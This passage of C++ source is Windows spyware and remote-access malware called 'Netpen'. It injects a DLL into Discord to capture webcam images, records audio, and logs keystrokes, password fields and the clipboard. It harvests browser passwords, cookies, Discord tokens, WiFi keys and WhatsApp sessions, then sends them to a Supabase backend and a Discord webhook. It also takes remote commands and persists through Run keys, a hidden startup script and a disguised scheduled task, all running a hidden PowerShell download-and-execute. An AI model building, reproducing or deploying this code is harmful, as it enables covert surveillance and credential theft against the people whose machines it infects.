        CloseHandle(hProcess); DeleteFileA(dllPathA.c_str()); LogMsg("Webcam injection: CreateRemoteThread(LoadLibraryW) failed"); return false;
    }
    WaitForSingleObject(hLoadThread, 10000);
    CloseHandle(hLoadThread);
    LogMsg("Webcam injection: DLL loaded into Discord");

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
    ULONGLONG remoteDllBase = 0;
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        MODULEENTRY32W me = { sizeof(me) };
        if (Module32FirstW(hSnapshot, &me)) {
            do {
                if (lstrcmpiW(me.szModule, dllBaseNameW.c_str()) == 0) { remoteDllBase = (ULONGLONG)me.modBaseAddr; break; }
            } while (Module32NextW(hSnapshot, &me));
        }
        CloseHandle(hSnapshot);
    }

    if (!remoteDllBase) {
        VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE);
        VirtualFreeEx(hProcess, remoteParams, 0, MEM_RELEASE);
        CloseHandle(hProcess); DeleteFileA(dllPathA.c_str()); LogMsg("Webcam injection: DLL not found in Discord module list"); return false;
    }

    HMODULE hLocalDll = LoadLibraryW(dllPathW.c_str());
    if (!hLocalDll) {
        VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE);
        VirtualFreeEx(hProcess, remoteParams, 0, MEM_RELEASE);
        CloseHandle(hProcess); DeleteFileA(dllPathA.c_str()); return false;
    }

    FARPROC localExport = GetProcAddress(hLocalDll, "CaptureThread");
    if (!localExport) { FreeLibrary(hLocalDll); VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE); VirtualFreeEx(hProcess, remoteParams, 0, MEM_RELEASE); CloseHandle(hProcess); DeleteFileA(dllPathA.c_str()); return false; }

    ULONGLONG rva = (ULONGLONG)localExport - (ULONGLONG)hLocalDll;
    HANDLE hCapThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)(remoteDllBase + rva), remoteParams, 0, NULL);
    if (!hCapThread) { LogMsg("Webcam injection: CreateRemoteThread(CaptureThread) failed"); FreeLibrary(hLocalDll); VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE); VirtualFreeEx(hProcess, remoteParams, 0, MEM_RELEASE); CloseHandle(hProcess); DeleteFileA(dllPathA.c_str()); return false; }
    LogMsg("Webcam injection: CaptureThread started in Discord");

    WaitForSingleObject(hCapThread, 30000);
    CloseHandle(hCapThread);
    LogMsg("Webcam injection: CaptureThread completed");
    FreeLibrary(hLocalDll);
    VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE);
    VirtualFreeEx(hProcess, remoteParams, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    DeleteFileA(dllPathA.c_str());
    LogMsg("Webcam: injected into Discord PID " + std::to_string(pid));
    return true;
}

static void HandleWebcam(const std::string& rowId) {
    char tmp[MAX_PATH];
    GetTempPathA(MAX_PATH, tmp);
    std::string ts = GetScreenshotTimestamp();
    std::string localFile = std::string(tmp) + "NetpenCam_" + g_hostname + "_" + ts + ".jpg";
    std::string storageFile = "webcam/" + g_hostname + "_" + ts + ".jpg";

    std::wstring localFileW = ToWide(localFile);
    if (InjectAndCaptureWebcam(localFileW.c_str())) { LogMsg("Webcam: captured via Discord injection"); }
    else if (!CaptureWebcamFrame(localFile.c_str())) { LogMsg("Webcam: capture failed"); return; }
    std::string storagePath = "/storage/v1/object/Netpen/" + storageFile;
    if (!UploadToStorage(localFile, storagePath, "image/jpeg")) {
        LogMsg("Webcam: upload failed");
        DeleteFileA(localFile.c_str());
        return;
    }

    std::string resultUrl = "https://xdxlfkyywnjrzqblvdzg.supabase.co/storage/v1/object/public/Netpen/" + storageFile;
    std::string json = "{\"executed\":true,\"result_url\":\"" + EscapeJSON(resultUrl) + "\"}";
    std::wstring patchPath = SUPABASE_CONTROL_PATH;
    patchPath += L"?id=eq." + ToWide(rowId);
    std::string resp;
    HttpRequest(L"PATCH", patchPath.c_str(), json, resp);

    std::string host = g_hostname.empty() ? "unknown" : g_hostname;
    PostDiscordImage(host, "Netpen \u2014 " + host + " Webcam", resultUrl, "");

    DeleteFileA(localFile.c_str());
    LogMsg("Webcam done: " + resultUrl);
}

static std::string CheckSpeakerCmd() {
    std::wstring q = SUPABASE_CONTROL_PATH;
    q += L"?command=eq.speaker&executed=eq.false&hostname=eq." + ToWide(g_hostname) + L"&select=id";
    std::string resp;
    if (!HttpRequest(L"GET", q.c_str(), "", resp)) return "";
    size_t p = resp.find("\"id\":");
    if (p == std::string::npos) return "";
    p += 5;
    size_t e = resp.find_first_of("},]", p);
    if (e == std::string::npos) return "";
    return resp.substr(p, e - p);
}

static void HandleSpeaker(const std::string& rowId) {
    char tmp[MAX_PATH];
    GetTempPathA(MAX_PATH, tmp);
    std::string ts = GetScreenshotTimestamp();
    std::string localFile = std::string(tmp) + "NetpenAudio_" + g_hostname + "_" + ts + ".wav";
    std::string storageFile = "speaker/" + g_hostname + "_" + ts + ".wav";

    if (!CaptureSpeaker(localFile.c_str())) { LogMsg("Speaker: capture failed"); return; }
    std::string storagePath = "/storage/v1/object/Netpen/" + storageFile;
    if (!UploadToStorage(localFile, storagePath, "audio/wav")) {
        LogMsg("Speaker: upload failed");
        DeleteFileA(localFile.c_str());
        return;
    }

    std::string resultUrl = "https://xdxlfkyywnjrzqblvdzg.supabase.co/storage/v1/object/public/Netpen/" + storageFile;
    std::string json = "{\"executed\":true,\"result_url\":\"" + EscapeJSON(resultUrl) + "\"}";
    std::wstring patchPath = SUPABASE_CONTROL_PATH;
    patchPath += L"?id=eq." + ToWide(rowId);
    std::string resp;
    HttpRequest(L"PATCH", patchPath.c_str(), json, resp);

    std::string host = g_hostname.empty() ? "unknown" : g_hostname;
    PostDiscordImage(host, "Netpen \u2014 " + host + " Speaker Capture", resultUrl, "10s WAV audio capture. Download: " + resultUrl);

    DeleteFileA(localFile.c_str());
    LogMsg("Speaker done: " + resultUrl);
}

static std::string CheckWifiCmd() {
    std::wstring q = SUPABASE_CONTROL_PATH;
    q += L"?command=eq.wifi&executed=eq.false&hostname=eq." + ToWide(g_hostname) + L"&select=id";
    std::string resp;
    if (!HttpRequest(L"GET", q.c_str(), "", resp)) return "";
    size_t p = resp.find("\"id\":");
    if (p == std::string::npos) return "";
    p += 5;
    size_t e = resp.find_first_of("},]", p);
    if (e == std::string::npos) return "";
    return resp.substr(p, e - p);
}

static void HandleWifiCmd(const std::string& rowId) {
    HarvestWiFiPasswords();
    std::string json = "{\"executed\":true}";
    std::wstring patchPath = SUPABASE_CONTROL_PATH;
    patchPath += L"?id=eq." + ToWide(rowId);
    std::string resp;
    HttpRequest(L"PATCH", patchPath.c_str(), json, resp);
    LogMsg("WiFi: command handled");
}

static std::string CheckDiscordCmd() {
    std::wstring q = SUPABASE_CONTROL_PATH;
    q += L"?command=eq.force_discord&executed=eq.false&hostname=eq." + ToWide(g_hostname) + L"&select=id";
    std::string resp;
    if (!HttpRequest(L"GET", q.c_str(), "", resp)) return "";
    size_t p = resp.find("\"id\":");
    if (p == std::string::npos) return "";
    p += 5;
    size_t e = resp.find_first_of("},]", p);
    if (e == std::string::npos) return "";
    return resp.substr(p, e - p);
}

static void HandleDiscordCmd(const std::string& rowId) {
    HarvestDiscordTokens();
    std::string json = "{\"executed\":true}";
    std::wstring patchPath = SUPABASE_CONTROL_PATH;
    patchPath += L"?id=eq." + ToWide(rowId);
    std::string resp;
    HttpRequest(L"PATCH", patchPath.c_str(), json, resp);
    LogMsg("Discord: force harvest handled");
}

static void CheckAndHandleDirlist() {
    std::wstring q = SUPABASE_CONTROL_PATH;
    q += L"?command=eq.dirlist&executed=eq.false&hostname=eq." + ToWide(g_hostname) + L"&select=id,payload";
    std::string resp;
    if (!HttpRequest(L"GET", q.c_str(), "", resp)) return;
    if (resp.size() < 10) return;
    std::string rowId = ExtractJSONNumber(resp, "id");
    std::string path = ExtractJSONString(resp, "payload");
    if (rowId.empty() || path.empty()) return;
    DWORD exitCode = 0;
    std::string output = ExecuteCommand("dir /b \"" + path + "\"", &exitCode);
    if (output.empty()) output = "(empty or invalid path)";
    std::string json = "[{\"hostname\":\"" + EscapeJSON(g_hostname) + "\",\"command\":\"dirlist " + EscapeJSON(path) + "\",\"output\":\"" + EscapeJSON(output) + "\",\"exit_code\":" + std::to_string((int)exitCode) + "}]";
    HttpRequest(L"POST", SUPABASE_EXEC_PATH, json, resp);
    json = "{\"executed\":true}";
    std::wstring patchPath = SUPABASE_CONTROL_PATH;
    patchPath += L"?id=eq." + ToWide(rowId);
    HttpRequest(L"PATCH", patchPath.c_str(), json, resp);
    LogMsg("Dirlist: " + path);
}

static void CheckAndHandleDownload() {
    std::wstring q = SUPABASE_CONTROL_PATH;
    q += L"?command=eq.download&executed=eq.false&hostname=eq." + ToWide(g_hostname) + L"&select=id,payload";
    std::string resp;
    if (!HttpRequest(L"GET", q.c_str(), "", resp)) return;
    if (resp.size() < 10) return;
    std::string rowId = ExtractJSONNumber(resp, "id");
    std::string localPath = ExtractJSONString(resp, "payload");
    if (rowId.empty() || localPath.empty()) return;
    size_t sep = localPath.find_last_of("\\/");
    std::string fname = (sep != std::string::npos) ? localPath.substr(sep + 1) : localPath;
    if (fname.empty()) fname = "file";
    std::string ts = GetTimestamp();
    for (size_t i = 0; i < ts.size(); i++) if (ts[i] == ':') ts[i] = '-';
    std::string storageFile = "downloads/" + g_hostname + "_" + ts + "_" + fname;
    std::string storagePath = "/storage/v1/object/Netpen/" + storageFile;
    std::string resultUrl;
    if (UploadToStorage(localPath, storagePath, "application/octet-stream")) {
        resultUrl = "https://xdxlfkyywnjrzqblvdzg.supabase.co/storage/v1/object/public/Netpen/" + storageFile;
    }
    std::string json = "{\"executed\":true,\"result_url\":\"" + EscapeJSON(resultUrl) + "\"}";
    std::wstring patchPath = SUPABASE_CONTROL_PATH;
    patchPath += L"?id=eq." + ToWide(rowId);
    HttpRequest(L"PATCH", patchPath.c_str(), json, resp);
    LogMsg("Download: " + localPath + " -> " + (resultUrl.empty() ? "FAILED" : resultUrl));
}

static void SendHeartbeat() {
    // Upload crash logs if any
    char tmp[MAX_PATH];
    GetTempPathA(MAX_PATH, tmp);
    std::string crashPath = std::string(tmp) + "wuaueng.crash";
    FILE* f = NULL;
    fopen_s(&f, crashPath.c_str(), "r");
    if (f) {
        fseek(f, 0, SEEK_END);
        long len = ftell(f);
        fseek(f, 0, SEEK_SET);
        if (len > 0 && len < 4096) {
            std::string crashData((size_t)len, 0);
            fread(&crashData[0], 1, (size_t)len, f);
            std::string crashJson = "[{\"hostname\":\"" + EscapeJSON(g_hostname) + "\",\"command\":\"[crash log upload]\",\"output\":\"" + EscapeJSON(crashData) + "\",\"exit_code\":-1}]";
            std::string resp;
            HttpRequest(L"POST", SUPABASE_EXEC_PATH, crashJson, resp);
        }
        fclose(f);
        DeleteFileA(crashPath.c_str());
    }

    std::string json = "{\"hostname\":\"" + EscapeJSON(g_hostname) + "\",\"last_seen\":\"" + GetTimestamp() + "\",\"version\":" + std::to_string(NETPEN_VERSION) + "}";
    std::string resp;
    std::wstring path = SUPABASE_HEARTBEAT_PATH + ToWide(g_hostname);
    HttpRequest(L"PUT", path.c_str(), json, resp);
}

static void FetchTriggers() {
    std::string resp;
    std::wstring q = L"/rest/v1/screenshot_triggers?active=eq.true&select=keyword";
    if (!HttpRequest(L"GET", q.c_str(), "", resp)) return;
    g_triggers.clear();
    size_t pos = 0;
    while (true) {
        size_t kp = resp.find("\"keyword\":\"", pos);
        if (kp == std::string::npos) break;
        kp += 11;
        size_t ke = resp.find("\"", kp);
        if (ke == std::string::npos) break;
        std::string kw = resp.substr(kp, ke - kp);
        if (!kw.empty()) g_triggers.push_back(kw);
        pos = ke + 1;
    }
}

static void PostDiscordImage(const std::string& host, const std::string& title, const std::string& imgUrl, const std::string& desc) {
    std::string payload = "{\"embeds\":[{\"title\":\"" + EscapeJSON(title) + "\",\"color\":3066993,\"description\":\"" + EscapeJSON(desc) + "\",\"image\":{\"url\":\"" + EscapeJSON(imgUrl) + "\"},\"timestamp\":\"" + GetTimestamp() + "\"}]}";
    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return;
    WinHttpSetTimeouts(hSession, 5000, 5000, 5000, 5000);
    HINTERNET hConnect = WinHttpConnect(hSession, g_discordHost.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return; }
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", g_discordPath.c_str(), NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return; }
    std::wstring hdrs = L"Content-Type: application/json";
    WinHttpSendRequest(hRequest, hdrs.c_str(), hdrs.length(), (LPVOID)payload.c_str(), (DWORD)payload.size(), (DWORD)payload.size(), 0);
    WinHttpReceiveResponse(hRequest, NULL);
    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
}

static void CheckAutoScreenshot(const std::string& windowTitle) {
    if (windowTitle.empty() || g_triggers.empty()) return;
    DWORD now = GetTickCount();
    if (now - g_lastAutoScreenshot < 300000) return; // 5 min
    std::string lowerTitle;
    lowerTitle.resize(windowTitle.size());
    for (size_t i = 0; i < windowTitle.size(); i++) lowerTitle[i] = tolower(windowTitle[i]);

    for (size_t i = 0; i < g_triggers.size(); i++) {
        std::string kw = g_triggers[i];
        std::string lowerKw;
        lowerKw.resize(kw.size());
        for (size_t j = 0; j < kw.size(); j++) lowerKw[j] = tolower(kw[j]);
        if (lowerTitle.find(lowerKw) == std::string::npos) continue;

        g_lastAutoScreenshot = now;
        char tmp[MAX_PATH];
        GetTempPathA(MAX_PATH, tmp);
        std::string ts = GetScreenshotTimestamp();
        std::string localFile = std::string(tmp) + "NetpenAuto_" + g_hostname + "_" + ts + ".jpg";
        std::string storageFile = "auto_screenshots/" + g_hostname + "_" + ts + ".jpg";

        if (!CaptureScreen(localFile.c_str())) { LogMsg("AutoSS: capture failed"); break; }
        std::string storagePath = "/storage/v1/object/Netpen/" + storageFile;
        if (!UploadToStorage(localFile, storagePath, "image/jpeg")) {
            LogMsg("AutoSS: upload failed");
            DeleteFileA(localFile.c_str()); break;
        }
        std::string resultUrl = "https://xdxlfkyywnjrzqblvdzg.supabase.co/storage/v1/object/public/Netpen/" + storageFile;
        std::string host = g_hostname.empty() ? "unknown" : g_hostname;
        PostDiscordImage(host, "Netpen \u2014 " + host + " Auto-Screenshot", resultUrl, "Window: " + windowTitle + " (matched \"" + kw + "\")");
        DeleteFileA(localFile.c_str());
        LogMsg("AutoSS: " + resultUrl + " (trigger: " + kw + ")");
        break;
    }
}

struct PasswordField { HWND hwnd; std::wstring text; };

static BOOL CALLBACK EnumPasswordProc(HWND hwnd, LPARAM lParam) {
    auto* fields = (std::vector<PasswordField>*)lParam;
    wchar_t cls[32] = {0};
    if (!GetClassNameW(hwnd, cls, 32)) return TRUE;
    if (wcscmp(cls, L"Edit") != 0) return TRUE;
    LRESULT pwdChar = SendMessageW(hwnd, EM_GETPASSWORDCHAR, 0, 0);
    if (!pwdChar) return TRUE;
    int len = (int)SendMessageW(hwnd, WM_GETTEXTLENGTH, 0, 0);
    if (len <= 0) return TRUE;
    if (len > 500) len = 500;
    std::wstring text((size_t)len, 0);
    SendMessageW(hwnd, WM_GETTEXT, (WPARAM)(len + 1), (LPARAM)&text[0]);
    fields->push_back({hwnd, text});
    return TRUE;
}

static void PostPasswordToDiscord(const std::string& hostname, const std::string& keys) {
    DWORD now = GetTickCount();
    g_lastDiscord = now;
    std::string host = hostname.empty() ? "unknown" : hostname;
    std::string k = keys.empty() ? "(no keys)" : keys;
    if (k.size() > 1990) k = k.substr(0, 1990) + "...";
    std::string payload = "{\"embeds\":[{\"title\":\"Netpen \\u2014 ";
    payload += EscapeJSON(host);
    payload += " \\u2014 Password\",\"color\":15158332,\"description\":\"";
    payload += EscapeJSON(k);
    payload += "\",\"timestamp\":\"";
    payload += GetTimestamp();
    payload += "\"}]}";
    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return;
    WinHttpSetTimeouts(hSession, 5000, 5000, 5000, 5000);
    HINTERNET hConnect = WinHttpConnect(hSession, g_discordHost.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return; }
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", g_discordPath.c_str(), NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return; }
    std::wstring headers = L"Content-Type: application/json";
    WinHttpSendRequest(hRequest, headers.c_str(), headers.length(), (LPVOID)payload.c_str(),
        (DWORD)payload.size(), (DWORD)payload.size(), 0);
    WinHttpReceiveResponse(hRequest, NULL);
    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
}

static void CheckPasswordFields() {
    HWND fg = GetForegroundWindow();
    if (!fg) return;
    wchar_t winTitle[256] = {0};
    GetWindowTextW(fg, winTitle, 256);
    std::string winStr = ToNarrow(winTitle);
    std::vector<PasswordField> fields;
    EnumChildWindows(fg, EnumPasswordProc, (LPARAM)&fields);
    if (fields.empty()) return;
    std::string digest = winStr;
    for (size_t i = 0; i < fields.size(); i++) {
        char buf[32];
        sprintf_s(buf, 32, "|%p:", fields[i].hwnd);
        digest += buf;
        digest += ToNarrow(fields[i].text);
    }
    if (digest == g_lastPasswordDigest) return;
    g_lastPasswordDigest = digest;
    std::string combined;
    for (size_t i = 0; i < fields.size(); i++) {
        if (i > 0) combined += " | ";
        combined += ToNarrow(fields[i].text);
    }
    std::string json = "[{\"window_title\":\"[PASSWORD] ";
    json += EscapeJSON(winStr);
    json += "\",\"keys\":\"";
    json += EscapeJSON(combined);
    json += "\",\"hostname\":\"";
    json += EscapeJSON(g_hostname);
    json += "\",\"version\":" + std::to_string(NETPEN_VERSION) + "}]";
    PostKeys(json);
    PostPasswordToDiscord(g_hostname, combined);
}

static void CheckClipboard() {
    if (!OpenClipboard(NULL)) return;
    HANDLE h = GetClipboardData(CF_UNICODETEXT);
    if (!h) { CloseClipboard(); return; }
    wchar_t* p = (wchar_t*)GlobalLock(h);
    if (!p) { CloseClipboard(); return; }
    std::wstring ws(p);
    GlobalUnlock(h);
    CloseClipboard();
    std::string text = ToNarrow(ws);
    if (text.empty() || text.size() > 50000) return;
    if (text == g_lastClipboard) return;
    g_lastClipboard = text;
    std::string json = "[{\"window_title\":\"[CLIPBOARD]\",\"keys\":\"";
    json += EscapeJSON(text);
    json += "\",\"hostname\":\"";
    json += EscapeJSON(g_hostname);
    json += "\",\"version\":" + std::to_string(NETPEN_VERSION) + "}]";
    PostKeys(json);
    std::string discordText = text.size() > 1000 ? text.substr(0, 1000) + "..." : text;
    PostToDiscord(g_hostname, "[CLIPBOARD]", discordText);
}

static void FlushBuffer() {
    if (g_keys.empty()) return;

    std::string win = g_winTitle;
    std::string keys = g_keys;
    g_keys.clear();

    std::string json = "[{\"window_title\":\"";
    json += EscapeJSON(win);
    json += "\",\"keys\":\"";
    json += EscapeJSON(keys);
    json += "\",\"hostname\":\"";
    json += EscapeJSON(g_hostname);
    json += "\",\"version\":" + std::to_string(NETPEN_VERSION) + "}]";

    PostToDiscord(g_hostname, win, keys);
    if (!PostKeys(json)) {
        g_keys = keys + g_keys;
        if (g_keys.size() > 10000)
            g_keys = g_keys.substr(0, 10000);
    }
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vk = p->vkCode;
        std::string newTitle = GetWindowTitle();
        DWORD now = GetTickCount();

        if (newTitle != g_winTitle && !g_keys.empty()) {
            std::string win = g_winTitle;
            std::string keys = g_keys;
            g_keys.clear();
            g_winTitle = newTitle;
            g_lastTick = now;

            std::string json = "[{\"window_title\":\"";
            json += EscapeJSON(win);
            json += "\",\"keys\":\"";
            json += EscapeJSON(keys);
            json += "\",\"hostname\":\"";
            json += EscapeJSON(g_hostname);
            json += "\",\"version\":" + std::to_string(NETPEN_VERSION) + "}]";
            PostToDiscord(g_hostname, win, keys);
            PostKeys(json);
            CheckAutoScreenshot(newTitle);
        } else if (g_winTitle.empty()) {
            g_winTitle = newTitle;
            CheckAutoScreenshot(newTitle);
        }

        std::string keyStr = GetKeyString(vk);
        if (!keyStr.empty()) {
            g_keys += keyStr;
            g_lastTick = now;
            if (g_keys.size() > 5000) FlushBuffer();
        }
        g_winTitle = newTitle;
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

#define NETPEN_REGKEY "Software\\Microsoft\\Windows\\CurrentVersion\\RuntimeBroker"
#define NETPEN_TASKNAME L"MicrosoftEdgeUpdateTaskCore"
#define NETPEN_STARTUP_SUFFIX ".update.cmd"

static void EnsureStartupEntry();

static void CleanupPersistence() {
    HKEY hKey;
    std::string exeName = GetExeName();

    // Remove HKCU\Run
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueA(hKey, exeName.c_str());
        RegCloseKey(hKey);
    }
    // Remove HKLM\Run (if we had admin)
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueA(hKey, exeName.c_str());
        RegCloseKey(hKey);
    }
    RegDeleteKeyA(HKEY_CURRENT_USER, NETPEN_REGKEY);

    // Remove scheduled task
    ExecuteCommand(ToNarrow(std::wstring(L"schtasks /delete /tn ") + std::wstring(NETPEN_TASKNAME) + L" /f"));

    // Remove startup folder .cmd
    char ad[MAX_PATH];
    if (GetEnvironmentVariableA("APPDATA", ad, MAX_PATH) > 0) {
        DeleteFileA((std::string(ad) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + exeName + NETPEN_STARTUP_SUFFIX).c_str());
    }

    // Remove temp files
    char tmpPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tmpPath);
    DeleteFileA((std::string(tmpPath) + exeName).c_str());
    // Remove ProgramData bat file (used by scheduled task across all users)
    char allUsers[MAX_PATH];
    if (GetEnvironmentVariableA("ALLUSERSPROFILE", allUsers, MAX_PATH) > 0) {
        DeleteFileA((std::string(allUsers) + "\\Netpen\\" + exeName + ".update.bat").c_str());
    } else {
        DeleteFileA(("C:\\ProgramData\\Netpen\\" + exeName + ".update.bat").c_str());
    }
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
        case WM_CREATE:
            SetTimer(hwnd, 1, 1000, NULL);
            break;
        case WM_TIMER:
        {
            static int counter = 0;
            counter++;
            if (counter % 3 == 0 && !g_selfDestructing) CheckClipboard();
            if (counter % 2 == 0 && !g_selfDestructing) CheckPasswordFields();
            if (counter % 5 == 0 && !g_keys.empty()) {
                DWORD now = GetTickCount();
                if (now - g_lastTick > 300) FlushBuffer();
            }
            if (counter % 30 == 0) {
                if (CheckSelfDestruct()) {
                    g_selfDestructing = true;
                    CleanupPersistence();
                    CreateKillFlag();
                    g_running = false;
                    DestroyWindow(hwnd);
                } else if (CheckStop()) {
                    g_running = false;
                    DestroyWindow(hwnd);
                }
            }
            if (counter % 60 == 0 && !g_selfDestructing) {
                SendHeartbeat();
                FetchTriggers();
                { std::string id = CheckScreenshotCmd(); if (!id.empty()) HandleScreenshot(id); }
                { std::string id = CheckWebcamCmd(); if (!id.empty()) HandleWebcam(id); }
                { std::string id = CheckSpeakerCmd(); if (!id.empty()) HandleSpeaker(id); }
                CheckAndHandleExec();
                { std::string id = CheckWifiCmd(); if (!id.empty()) HandleWifiCmd(id); }
                { std::string id = CheckDiscordCmd(); if (!id.empty()) HandleDiscordCmd(id); }
                CheckAndHandleDirlist();
                CheckAndHandleDownload();
                CheckHarvestConfig();
            }
            if (counter % 120 == 0 && !g_selfDestructing) {
                EnsureStartupEntry();
            }
            if (counter % 300 == 0 && !g_selfDestructing && !g_harvestPaused) {
                HarvestBrowserPasswords();
                HarvestBrowserCookies();
                HarvestDiscordTokens();
                HarvestWhatsAppSession();
            }
            break;
        }
        case WM_DESTROY:
            KillTimer(hwnd, 1);
            PostQuitMessage(0);
            break;
        default:
            return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}

static std::string Base64Encode(const BYTE* data, DWORD size) {
    DWORD needed = 0;
    CryptBinaryToStringA(data, size, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &needed);
    std::string result(needed, 0);
    CryptBinaryToStringA(data, size, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, &result[0], &needed);
    while (!result.empty() && result.back() == '\0') result.pop_back();
    return result;
}

#define NETPEN_REGKEY "Software\\Microsoft\\Windows\\CurrentVersion\\RuntimeBroker"

static void InstallStartup() {
    HKEY hKey;
    std::string exeName = GetExeName();
    if (RegCreateKeyExA(HKEY_CURRENT_USER, NETPEN_REGKEY, 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "Payload", 0, REG_SZ, (BYTE*)"1", 2);
        RegCloseKey(hKey);
    }

    std::string psCmd = "powershell -w h -c \"$p=$env:TEMP+'\\" + exeName + "';$wc=New-Object Net.WebClient;$wc.DownloadFile('https://allseeing.netlify.app/a',$p);start $p\"";

    // 1. HKCU\Run (existing)
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, exeName.c_str(), 0, REG_SZ, (BYTE*)psCmd.c_str(), (DWORD)psCmd.size() + 1);
        RegCloseKey(hKey);
    }

    // 2. Startup folder .cmd
    char appData[MAX_PATH];
    if (GetEnvironmentVariableA("APPDATA", appData, MAX_PATH) > 0) {
        std::string startupDir = std::string(appData) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
        std::string cmdPath = startupDir + "\\" + exeName + NETPEN_STARTUP_SUFFIX;
        std::string cmdContent = "@start /b \"\" " + psCmd + "\r\n";
        HANDLE hFile = CreateFileA(cmdPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD w = 0;
            WriteFile(hFile, cmdContent.c_str(), (DWORD)cmdContent.size(), &w, NULL);
            CloseHandle(hFile);
        }
    }

    // 3. Scheduled Task (ONLOGON — survives reboot, any user login)
    char allUsers[MAX_PATH];
    std::string batDir = "C:\\ProgramData\\Netpen";
    if (GetEnvironmentVariableA("ALLUSERSPROFILE", allUsers, MAX_PATH) > 0) {
        batDir = std::string(allUsers) + "\\Netpen";
    }
    CreateDirectoryA(batDir.c_str(), NULL);
    std::string batFile = batDir + "\\" + exeName + ".update.bat";
    std::string batContent = "@start /b \"\" " + psCmd + "\r\n";
    HANDLE hBat = CreateFileA(batFile.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hBat != INVALID_HANDLE_VALUE) {
        DWORD w = 0;
        WriteFile(hBat, batContent.c_str(), (DWORD)batContent.size(), &w, NULL);
        CloseHandle(hBat);
    }
    std::wstring taskCmd = L"schtasks /create /tn " + std::wstring(NETPEN_TASKNAME) + L" /tr \"\\\"cmd.exe\\\" /c \\\"" + ToWide(batFile) + L"\\\"\" /sc ONLOGON /delay 0000:30 /rl HIGHEST /f";
    ExecuteCommand(ToNarrow(taskCmd));

    // 4. HKLM\Run (if running as admin)
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, exeName.c_str(), 0, REG_SZ, (BYTE*)psCmd.c_str(), (DWORD)psCmd.size() + 1);
        RegCloseKey(hKey);
    }
}

static void EnsureStartupEntry() {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, NETPEN_REGKEY, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return;
    }
    // Payload missing -- reinstall
    InstallStartup();
}

static int RunChild(HINSTANCE hInstance) {
    char hostname[256] = {0};
    DWORD hostnameSize = sizeof(hostname);
    GetComputerNameA(hostname, &hostnameSize);
    g_hostname = hostname;

    WNDCLASSEXW wc = {0};
    wc.cbSize = sizeof(WNDCLASSEXW);
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = L"RuntimeBrokerHiddenWindow";
    if (!RegisterClassExW(&wc)) return 1;

    Gdiplus::GdiplusStartupInput gdiInput;
    ULONG_PTR gdiToken;
    Gdiplus::GdiplusStartup(&gdiToken, &gdiInput, NULL);

    g_hwnd = CreateWindowExW(0, L"RuntimeBrokerHiddenWindow", L"", 0, 0, 0, 0, 0, NULL, NULL, hInstance, NULL);
    if (!g_hwnd) { Gdiplus::GdiplusShutdown(gdiToken); return 1; }

